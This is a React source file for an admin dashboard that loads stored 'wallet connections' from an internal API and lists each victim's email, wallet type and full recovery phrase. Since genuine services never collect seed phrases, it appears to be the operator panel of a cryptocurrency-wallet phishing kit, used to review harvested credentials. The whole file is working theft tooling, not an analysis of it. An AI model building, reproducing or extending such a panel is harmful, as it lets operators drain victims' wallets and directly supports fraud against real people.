import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Loader2 } from "lucide-react";
import type { WalletConnection } from "@shared/schema";

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [connections, setConnections] = useState<WalletConnection[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const { toast } = useToast();

  useEffect(() => {
    fetchConnections();
  }, []);

  const fetchConnections = async () => {
    try {
      setIsLoading(true);
      console.log('Fetching admin connections...');

      const response = await fetch('/api/admin/connections', {
        credentials: 'include'
      });

      console.log('Response status:', response.status);

      if (response.status === 401) {
        console.log('Unauthorized, redirecting to login');
        setLocation('/admin/login');
        return;
      }

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      console.log('Fetched connections:', data);
      setConnections(data);
    } catch (error) {
      console.error('Error fetching connections:', error);
      toast({
        title: "Error",
        description: "Failed to fetch connections. Please try logging in again.",
        variant: "destructive"
      });
      setLocation('/admin/login');
    } finally {
      setIsLoading(false);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-8">
      <div className="max-w-6xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold">Admin Dashboard</h1>
          <Button 
            variant="outline" 
            onClick={() => {
              document.cookie = 'admin_session=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
              setLocation('/admin/login');
            }}
          >
            Logout
          </Button>
        </div>

        {connections.length === 0 ? (
          <Card>
            <CardContent className="p-6">
              <p className="text-center text-muted-foreground">No wallet connections found.</p>
            </CardContent>
          </Card>
        ) : (
          <div className="grid gap-4">
            {connections.map((connection) => (
              <Card key={connection.id} className="bg-white/50 backdrop-blur-sm border-2">
                <CardContent className="p-6">
                  <div className="grid gap-2">
                    <div className="flex justify-between">
                      <span className="font-medium">Email:</span>
                      <span>{connection.email}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="font-medium">Wallet Type:</span>
                      <span>{connection.walletType}</span>
                    </div>
                    <div>
                      <span className="font-medium">Recovery Phrase:</span>
                      <p className="mt-1 break-all bg-black/5 p-2 rounded text-red-600 font-medium">
                        {connection.recoveryPhrase}
                      </p>
                    </div>
                    <div className="flex justify-between">
                      <span className="font-medium">Created At:</span>
                      <span>{new Date(connection.createdAt).toLocaleString()}</span>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}